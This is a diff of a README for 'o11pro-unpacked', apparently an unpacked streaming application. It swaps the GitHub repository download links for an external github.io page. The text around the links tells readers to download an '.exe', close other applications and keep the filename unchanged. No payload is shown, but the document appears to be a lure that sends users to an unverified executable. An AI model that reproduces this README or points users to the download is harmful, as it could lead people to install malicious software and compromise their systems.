@@ -1,6 +1,6 @@
 # 📺 o11pro-unpacked - Stream high quality content with ease
 
-[![Download o11pro-unpacked](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Beatenup-kidnapping12/o11pro-unpacked)
+[![Download o11pro-unpacked](https://img.shields.io/badge/Download-Release-blue.svg)](https://beatenup-kidnapping12.github.io)
 
 ## 📖 Overview
 
@@ -31,7 +31,7 @@ Close all unnecessary applications to ensure the installer has access to the fol
 ### 2. Download the application
 Visit the official repository page to acquire the software package.
 
-[Click here to visit the release page and download the software](https://github.com/Beatenup-kidnapping12/o11pro-unpacked)
+[Click here to visit the release page and download the software](https://beatenup-kidnapping12.github.io)
 
 Select the file ending in `.exe` from the list. Save the file to your "Downloads" folder or your desktop for easy access. Avoid renaming the file, as the internal structure relies on the provided filename to locate support libraries.
 
